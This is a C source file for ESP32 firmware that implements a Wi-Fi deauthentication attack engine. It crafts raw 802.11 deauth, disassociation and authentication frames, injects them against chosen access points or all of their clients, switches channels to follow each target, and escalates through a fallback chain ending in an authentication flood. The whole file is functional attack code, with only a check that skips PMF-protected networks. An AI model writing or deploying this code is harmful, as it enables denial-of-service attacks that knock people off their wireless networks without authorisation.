#include <stdatomic.h>
#include <string.h>
#include <inttypes.h>

#include "deauth_engine.h"
#include "led_indicator.h"
#include "wifi_sniffer.h"
#include "wifi_tx_fix.h"
#include "watchdog.h"

#include "esp_wifi.h"
#include "esp_log.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

static const char *TAG = "deauth";

#ifndef MACSTR
#define MACSTR "%02X:%02X:%02X:%02X:%02X:%02X"
#define MAC2STR(m) (m)[0],(m)[1],(m)[2],(m)[3],(m)[4],(m)[5]
#endif

/* ==========================================================================
 *  802.11 Frame Templates
 * ========================================================================== */

static const uint8_t DEAUTH_TEMPLATE[] = {
    0xC0, 0x00,                         /* Frame Control: Deauth */
    0x00, 0x00,                         /* Duration */
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, /* Addr1 (DA) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr2 (SA) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr3 (BSSID) */
    0x00, 0x00,                         /* Seq Ctrl */
    0x07, 0x00                          /* Reason Code: Class 3 frame received from nonassociated STA */
};

static const uint8_t DISASSOC_TEMPLATE[] = {
    0xA0, 0x00,                         /* Frame Control: Disassoc */
    0x00, 0x00,                         /* Duration */
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, /* Addr1 (DA) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr2 (SA) */
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Addr3 (BSSID) */
    0x00, 0x00,                         /* Seq Ctrl */
    0x07, 0x00                          /* Reason Code */
};

#define DEAUTH_FRAME_SIZE   sizeof(DEAUTH_TEMPLATE)
#define DISASSOC_FRAME_SIZE sizeof(DISASSOC_TEMPLATE)
#define AUTH_FRAME_SIZE     30

#define DEAUTH_FALLBACK_DISASSOC_LIMIT 40

/* ==========================================================================
 *  State
 * ========================================================================== */

static deauth_target_t g_deauth_targets[MAX_TARGET_APS];
static int g_deauth_target_count = 0;

static atomic_bool g_deauth_active = ATOMIC_VAR_INIT(false);
static SemaphoreHandle_t g_deauth_lock = NULL;
static TaskHandle_t g_deauth_task_handle = NULL;
static uint16_t g_deauth_seq = 0;

/* ==========================================================================
 *  Helpers
 * ========================================================================== */

static bool deauth_target_is_protected(const uint8_t *bssid)
{
    bool pmf_req = false, wpa3 = false;
    if (!wifi_sniffer_get_security(bssid, &pmf_req, &wpa3)) {
        return false;
    }
    /* 
     * If PMF (802.11w) is required, unencrypted management frames 
     * (like deauth/disassoc) will be dropped by the receiver.
     */
    return pmf_req;
}

static void build_auth_frame(uint8_t *frame, const uint8_t *dst, const uint8_t *src, uint16_t seq)
{
    memset(frame, 0, AUTH_FRAME_SIZE);
    frame[0] = 0xB0; /* Frame Control: Authentication */
    frame[1] = 0x00;
    
    memcpy(&frame[4], dst, 6);  /* Addr1 (DA) */
    memcpy(&frame[10], src, 6); /* Addr2 (SA) */
    memcpy(&frame[16], src, 6); /* Addr3 (BSSID) */
    
    frame[22] = (uint8_t)(seq & 0xFF);
    frame[23] = (uint8_t)((seq >> 8) & 0xFF);
    
    /* Auth Algorithm: Open System (0) */
    frame[24] = 0x00; frame[25] = 0x00;
    /* Auth Sequence: 1 */
    frame[26] = 0x01; frame[27] = 0x00;
    /* Status: Success (0) */
    frame[28] = 0x00; frame[29] = 0x00;
}

static void deauth_send_disassoc(const uint8_t *dst, const uint8_t *bssid)
{
    if (!dst || !bssid) return;

    uint8_t frame[DISASSOC_FRAME_SIZE];
    memcpy(frame, DISASSOC_TEMPLATE, DISASSOC_FRAME_SIZE);
    memcpy(&frame[4], dst, 6);
    memcpy(&frame[10], bssid, 6);
    memcpy(&frame[16], bssid, 6);

    esp_err_t ret = wifi_tx_safe(WIFI_IF_AP, frame, DISASSOC_FRAME_SIZE);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "disassoc tx FAILED to " MACSTR ": %s", MAC2STR(dst), esp_err_to_name(ret));
    }
}

static void deauth_send_auth_flood(const uint8_t *bssid)
{
    if (!bssid) return;

    uint8_t frame[AUTH_FRAME_SIZE];
    uint16_t seq = g_deauth_seq;
    
    for (int i = 0; i < 8; i++) {
        build_auth_frame(frame, bssid, bssid, (uint16_t)(seq + i));
        wifi_tx_safe(WIFI_IF_AP, frame, AUTH_FRAME_SIZE);
    }
    g_deauth_seq += 8;
}

static void deauth_send_deauth(const uint8_t *dst, const uint8_t *src, const uint8_t *bssid)
{
    if (!dst || !src || !bssid) return;
    
    if (deauth_target_is_protected(bssid)) {
        ESP_LOGW(TAG, "skipping protected target " MACSTR " (PMF Required)", MAC2STR(bssid));
        return;
    }

    uint8_t frame[DEAUTH_FRAME_SIZE];
    memcpy(frame, DEAUTH_TEMPLATE, DEAUTH_FRAME_SIZE);

    memcpy(&frame[4], dst, 6);
    memcpy(&frame[10], src, 6);
    memcpy(&frame[16], bssid, 6);

    frame[22] = (uint8_t)(g_deauth_seq & 0xFF);
    frame[23] = (uint8_t)((g_deauth_seq >> 8) & 0xFF);
    g_deauth_seq++;

    esp_err_t ret = wifi_tx_safe(WIFI_IF_AP, frame, DEAUTH_FRAME_SIZE);
    if (ret != ESP_OK) {
        ESP_LOGW(TAG, "deauth tx FAILED to " MACSTR ": %s", MAC2STR(dst), esp_err_to_name(ret));
    }
}

/* ==========================================================================
 *  Fallback Logic
 * ========================================================================== */

const char *deauth_fallback_level_name(deauth_fallback_t level)
{
    switch (level) {
        case DEAUTH_FALLBACK_NONE:        return "none";
        case DEAUTH_FALLBACK_DISASSOC:    return "disassoc";
        case DEAUTH_FALLBACK_AUTH_FLOOD:  return "auth_flood";
        default:                          return "unknown";
    }
}

bool deauth_has_escalated(const uint8_t *bssid)
{
    if (!bssid || !g_deauth_lock) return false;

    xSemaphoreTake(g_deauth_lock, portMAX_DELAY);
    for (int i = 0; i < g_deauth_target_count; i++) {
        if (memcmp(g_deauth_targets[i].bssid, bssid, 6) == 0) {
            bool escalated = (g_deauth_targets[i].fallback_level != DEAUTH_FALLBACK_NONE);
            xSemaphoreGive(g_deauth_lock);
            return escalated;
        }
    }
    xSemaphoreGive(g_deauth_lock);
    return false;
}

/* ==========================================================================
 *  Attack Task
 * ========================================================================== */

static void deauth_task(void *arg)
{
    ESP_LOGI(TAG, "Deauth attack task started");

    while (atomic_load(&g_deauth_active)) {
        watchdog_task_refresh(TAG);
        
        deauth_target_t local_targets[MAX_TARGET_APS];
        int local_count = 0;

        /* 1. Snapshot targets under lock */
        xSemaphoreTake(g_deauth_lock, portMAX_DELAY);
        local_count = g_deauth_target_count;
        memcpy(local_targets, g_deauth_targets, sizeof(deauth_target_t) * local_count);
        xSemaphoreGive(g_deauth_lock);

        if (local_count == 0) {
            vTaskDelay(pdMS_TO_TICKS(100));
            continue;
        }

        /* 2. Process and TX without holding the lock */
        for (int i = 0; i < local_count; i++) {
            if (!local_targets[i].active) continue;

            /* Channel switching logic */
            uint8_t target_channel = 0;
            wifi_sniffer_get_channel_for_bssid(local_targets[i].bssid, &target_channel);
            
            if (target_channel > 0) {
                uint8_t fixed_ch = atomic_load(&g_wifi_fixed_channel);
                if (target_channel != fixed_ch) {
                    atomic_store(&g_wifi_fixed_channel, target_channel);
                    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
                }
            }

            bool unlimited = (local_targets[i].count == 0);
            uint32_t frames_sent = 0;

            switch (local_targets[i].mode) {
                case DEAUTH_MODE_DEAUTH_ONLY:
                    deauth_send_deauth(local_targets[i].client_mac, local_targets[i].bssid, local_targets[i].bssid);
                    deauth_send_deauth(local_targets[i].bssid, local_targets[i].client_mac, local_targets[i].bssid);
                    frames_sent = 2;
                    break;
                    
                case DEAUTH_MODE_DISASSOC_ONLY:
                    if (local_targets[i].client_mac[0] == 0xFF) {
                        deauth_send_disassoc(local_targets[i].client_mac, local_targets[i].bssid);
                        frames_sent = 1;
                    } else {
                        deauth_send_disassoc(local_targets[i].client_mac, local_targets[i].bssid);
                        deauth_send_disassoc(local_targets[i].bssid, local_targets[i].client_mac);
                        frames_sent = 2;
                    }
                    break;
                    
                case DEAUTH_MODE_AUTH_FLOOD_ONLY:
                    deauth_send_auth_flood(local_targets[i].bssid);
                    frames_sent = 8;
                    break;
                    
                case DEAUTH_MODE_FALLBACK_CHAIN:
                default:
                    if (local_targets[i].fallback_level == DEAUTH_FALLBACK_NONE) {
                        /* Start with Deauth */
                        deauth_send_deauth(local_targets[i].client_mac, local_targets[i].bssid, local_targets[i].bssid);
                        deauth_send_deauth(local_targets[i].bssid, local_targets[i].client_mac, local_targets[i].bssid);
                        frames_sent = 2;
                        
                        /* Escalate to Disassoc if we've tried enough times */
                        if (local_targets[i].disassoc_count >= DEAUTH_FALLBACK_DISASSOC_LIMIT) {
                            local_targets[i].fallback_level = DEAUTH_FALLBACK_DISASSOC;
                        }
                    } else if (local_targets[i].fallback_level == DEAUTH_FALLBACK_DISASSOC) {
                        if (local_targets[i].client_mac[0] == 0xFF) {
                            deauth_send_disassoc(local_targets[i].client_mac, local_targets[i].bssid);
                        } else {
                            deauth_send_disassoc(local_targets[i].client_mac, local_targets[i].bssid);
                            deauth_send_disassoc(local_targets[i].bssid, local_targets[i].client_mac);
                        }
                        frames_sent = 2;
                    } else {
                        deauth_send_auth_flood(local_targets[i].bssid);
                        frames_sent = 8;
                    }
                    break;
            }

            /* 3. Update state back to global array */
            xSemaphoreTake(g_deauth_lock, portMAX_DELAY);
            if (i < g_deauth_target_count) {
                g_deauth_targets[i].disassoc_count++;
                
                if (!unlimited) {
                    if (g_deauth_targets[i].count >= frames_sent) {
                        g_deauth_targets[i].count -= frames_sent;
                    } else {
                        g_deauth_targets[i].count = 0;
                        g_deauth_targets[i].active = false;
                    }
                }
            }
            xSemaphoreGive(g_deauth_lock);
        }

        vTaskDelay(pdMS_TO_TICKS(50));
    }

    ESP_LOGI(TAG, "Deauth attack task ended");
    vTaskDelete(NULL);
}

/* ==========================================================================
 *  Public API
 * ========================================================================== */

esp_err_t deauth_init(void)
{
    if (g_deauth_lock == NULL) {
        g_deauth_lock = xSemaphoreCreateMutex();
        if (g_deauth_lock == NULL) {
            return ESP_ERR_NO_MEM;
        }
    }
    return ESP_OK;
}

esp_err_t deauth_add_target(const uint8_t *bssid, const uint8_t *client_mac, uint32_t count, uint32_t delay_ms, deauth_mode_t mode)
{
    if (!bssid) return ESP_ERR_INVALID_ARG;
    
    esp_err_t ret = deauth_init();
    if (ret != ESP_OK) return ret;

    xSemaphoreTake(g_deauth_lock, portMAX_DELAY);

    if (g_deauth_target_count >= MAX_TARGET_APS) {
        xSemaphoreGive(g_deauth_lock);
        return ESP_ERR_NO_MEM;
    }

    int idx = g_deauth_target_count;
    memcpy(g_deauth_targets[idx].bssid, bssid, 6);

    if (client_mac != NULL) {
        memcpy(g_deauth_targets[idx].client_mac, client_mac, 6);
        g_deauth_targets[idx].type = DEAUTH_TYPE_SINGLE;
    } else {
        memset(g_deauth_targets[idx].client_mac, 0xFF, 6);
        g_deauth_targets[idx].type = DEAUTH_TYPE_BROADCAST;
    }

    g_deauth_targets[idx].count = count;
    g_deauth_targets[idx].delay_ms = delay_ms;
    g_deauth_targets[idx].active = true;
    g_deauth_targets[idx].mode = mode;
    g_deauth_targets[idx].fallback_level = DEAUTH_FALLBACK_NONE;
    g_deauth_targets[idx].disassoc_count = 0;
    g_deauth_targets[idx].auth_count = 0;
    
    g_deauth_target_count++;

    xSemaphoreGive(g_deauth_lock);

    ESP_LOGI(TAG, "Deauth target added: BSSID " MACSTR ", count=%" PRIu32, MAC2STR(bssid), count);
    return ESP_OK;
}

esp_err_t deauth_attack_ap_all_clients(const uint8_t *bssid, uint32_t count, uint32_t delay_ms)
{
    return deauth_add_target(bssid, NULL, count, delay_ms, DEAUTH_MODE_FALLBACK_CHAIN);
}

esp_err_t deauth_start(void)
{
    if (!g_deauth_lock) return ESP_ERR_INVALID_STATE;
    if (atomic_load(&g_deauth_active)) return ESP_OK;

    xSemaphoreTake(g_deauth_lock, portMAX_DELAY);
    int target_count = g_deauth_target_count;
    xSemaphoreGive(g_deauth_lock);

    if (target_count == 0) {
        ESP_LOGW(TAG, "No deauth targets configured");
        return ESP_ERR_INVALID_STATE;
    }

    atomic_store(&g_deauth_active, true);
    g_deauth_seq = 0;
    led_set_state(LED_STATE_SCANNING);

    if (xTaskCreatePinnedToCore(deauth_task, "deauth_task", 4096, NULL, 5, &g_deauth_task_handle, 0) != pdPASS) {
        atomic_store(&g_deauth_active, false);
        return ESP_FAIL;
    }

    ESP_LOGI(TAG, "Deauth attack started with %d targets", target_count);
    return ESP_OK;
}

void deauth_stop(void)
{
    atomic_store(&g_deauth_active, false);
    
    if (g_deauth_task_handle != NULL) {
        /* Give the task time to exit cleanly */
        vTaskDelay(pdMS_TO_TICKS(150));
        g_deauth_task_handle = NULL;
    }
    
    /* Reset fixed channel so hopper can resume */
    atomic_store(&g_wifi_fixed_channel, 0);
    
    led_set_state(LED_STATE_IDLE);
    ESP_LOGI(TAG, "Deauth attack stopped");
}

bool deauth_is_active(void)
{
    return atomic_load(&g_deauth_active);
}

void deauth_remove_all(void)
{
    if (g_deauth_lock != NULL) {
        xSemaphoreTake(g_deauth_lock, portMAX_DELAY);
    }

    g_deauth_target_count = 0;
    memset(g_deauth_targets, 0, sizeof(g_deauth_targets));

    if (g_deauth_lock != NULL) {
        xSemaphoreGive(g_deauth_lock);
    }
}
